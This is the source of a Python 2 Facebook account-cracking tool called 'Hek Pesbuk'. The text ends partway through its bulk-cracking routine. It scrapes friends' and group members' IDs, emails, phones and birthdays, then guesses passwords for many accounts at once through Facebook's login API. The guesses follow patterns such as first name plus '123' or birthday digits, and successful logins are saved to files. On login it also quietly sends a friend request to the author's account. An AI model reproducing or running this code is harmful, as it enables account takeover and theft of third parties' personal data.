#!/usr/bin/python
# -*- coding: utf-8 -*-
# Hek Pesbuk
# Coded by Senja
# Github: github.com/thedarksec/Hekpesbuk

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print ''
    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit'
    print ''
    print ''
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = """
     \x1b[0;41;31m[ ]\x1b[0m \x1b[0;42;32m[ ]\x1b[0m \x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[⁂]\x1b[0m
      |   |   |          |
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m Hek \x1b[0;97;45;1m Pesbuk \033[0;90;43;1m Darkvip \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
              \x1b[1;77m/\x1b[0m
     \x1b[0;90;47;1m * \x1b[0;1;77;104m Coded by \x1b[0;1;77;101m # Senja \x1b[0m
"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading \x1b[0m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[0mNot Vuln'
vuln = '\x1b[0mVuln'


def login():
    os.system('clear')
    os.system('reset')
    time.sleep(1)
    print ''
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[0mPlease Login Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]'
        id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ')
        pwd = getpass.getpass('\x1b[0m[\x1b[93;1m+\x1b[0m] \x1b[0mPassword \x1b[0m:\x1b[0m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[0m[\x1b[96;1m!\x1b[0m] \x1b[77;1mNo connection network'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCpVqkAi_sqVf-ZPwzRjME0Q')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo connection network'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Has Baned Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mOpen not found'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Has Baned Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo connection network'
            keluar()

    os.system('clear')
    os.system('reset')
    print ''
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mName   : \x1b[0m' + nama + (39 - len(nama)) * '\x1b[0m '+''
    print '\x1b[0m[\x1b[95;1m@\x1b[0m] \x1b[77;1mID     : \x1b[0m' + id + (39 - len(id)) *     '\x1b[0m '+''
    print '\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mFollow : \x1b[0m' + sub + (39 - len(sub)) *   '\x1b[0m '+''
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mUser Information'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mHack Facebook Account'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mBot'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mOthers'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mUpdate'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mLogout'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mExit'
    print ''
    pilih()


def pilih():
    zedd = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if zedd == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                menu_hack()
            else:
                if zedd == '3':
                    menu_bot()
                else:
                    if zedd == '4':
                        lain()
                    else:
                        if zedd == '5':
                            os.system('clear')
                            os.system('reset')
                            print ''
                            print logo
                            print ''
                            os.system('git pull origin master')
                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                            menu()
                        else:
                            if zedd == '6':
                                os.system('rm -rf login.txt')
				os.system('xdg-open https://m.facebook.com/rizz.magizz')
                                keluar()
                            else:
                                if zedd == '0':
                                    keluar()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + zedd + ' \x1b[77;1mNot availabel'
                                    pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    id = raw_input('\x1b[0m[\x1b[92;1m?\x1b[0m] \x1b[77;1mInput ID/Name: \x1b[0m')
    jalan('\x1b[0m[\x1b[95;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mProcessing \x1b[77;1m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            try:
                print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mName\x1b[77;1m          : ' + z['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mName\x1b[77;1m          : \x1b[77;1mNot found'
            else:
                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mId\x1b[77;1m            : ' + z['id']
                except KeyError:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mId\x1b[77;1m            : \x1b[77;1mNot found'
                else:
                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mEmail\x1b[77;1m         : ' + z['email']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mEmail\x1b[77;1m         : \x1b[77;1mNot found'
                    else:
                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPhone Number\x1b[77;1m  : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mPhone Number\x1b[77;1m  : \x1b[77;1mNot found'

                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mLocation\x1b[77;1m      : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mLocation\x1b[77;1m      : \x1b[77;1mNot found'

                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mBirthday\x1b[77;1m      : ' + z['birthday']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mBirthday\x1b[77;1m      : \x1b[77;1mNot found'

                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSchool\x1b[77;1m        : '
                    for q in z['education']:
                        try:
                            print '\x1b[0m                   ~ \x1b[77;1m' + q['school']['name']
                        except KeyError:
                            print '\x1b[0m                   ~ \x1b[77;1mNot found'

                except KeyError:
                    pass

            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu()
    else:
        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mUser not found'
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mMini Hack Facebook (\x1b[0mTarget\x1b[0m)'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mMulti Bruteforce Facebook'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mSuper Multi Bruteforce Facebook'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mBruteForce (\x1b[0mTarget\x1b[0m)'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mYahoo Checker'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mGet ID/Email/HP'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if hack == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    menu()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0] ' + hack + ' \x1b[77;1mNot found'
                                    hack_pilih()


def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[ \x1b[94;1mINFO \x1b[0m] \x1b[77;1mTarget must be your friend!'
        print ''
        try:
            id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Target :\x1b[77;1m ')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mName\x1b[77;1m : ' + a['name']
            jalan('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mChecking \x1b[77;1m...')
            time.sleep(2)
            jalan('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mOpen security \x1b[77;1m...')
            time.sleep(2)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz1
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz1
                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz2
                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz2
                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz3
                                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz3
                                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz4
                                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[m0] \x1b[0mPassword\x1b[77;1m : ' + pz4
                                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSorry, opening password target failed :('
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTry other method.'
                                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTerget not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile ID : \x1b[0m')
        passw = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mPassword : \x1b[0m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_hack()


def scrak():
    global back
    global success
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Success.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                success.append('\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[0m[\x1b[91;1m\xe2\x9c\x9a\x1b[0m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[0m[\x1b[95;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mCrack    \x1b[77;1m:\x1b[77;1m ' + str(back) + ' \x1b[0m>\x1b[77;1m ' + str(len(up)) + ' =>\x1b[0mLive\x1b[77;1m:\x1b[77;1m' + str(len(success)) + ' \x1b[0m=>\x1b[0mCheck\x1b[77;1m:\x1b[77;1m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mConnection busy'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'


def hasil():
    print''
    for b in success:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFailed \x1b[0m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mCrack from Friends'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mCrack from Group'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mCrack from File'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if peak == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            jalan('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mInput ID from friend \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                os.system('reset')
                print ''
                print logo
                print ''
                idg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Group :\x1b[77;1m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mGroup name :\x1b[77;1m ' + asw['name']
                except KeyError:
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup not found'
                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
                    
            else:
                if peak == '3':
                    os.system('clear')
                    os.system('reset')
                    print ''
                    print logo
                    print ''
                    try:
                        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mFile ID : \x1b[77;1m')
                        for line in open(idlist,'r').readlines():
                        	id.append(line.strip())
                    except IOError:
                        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                        super()

                else:
                    if peak == '0':
                        menu_hack()
                    else:
                        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + peak + ' \x1b[77;1mNot found'
                        pilih_super()
    print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mTotal ID : \x1b[77;1m' + str(len(id))
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[0m[\x1b[94;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mCrack \x1b[77;1m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass1
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass1
                    else:
                            pass2 = b['firs_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + user + ' | ' + pass2
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x9a\x1b[0m] ' + user + ' | ' + pass2
                                else:
                                        pass3 = b['last_name'] + '123'
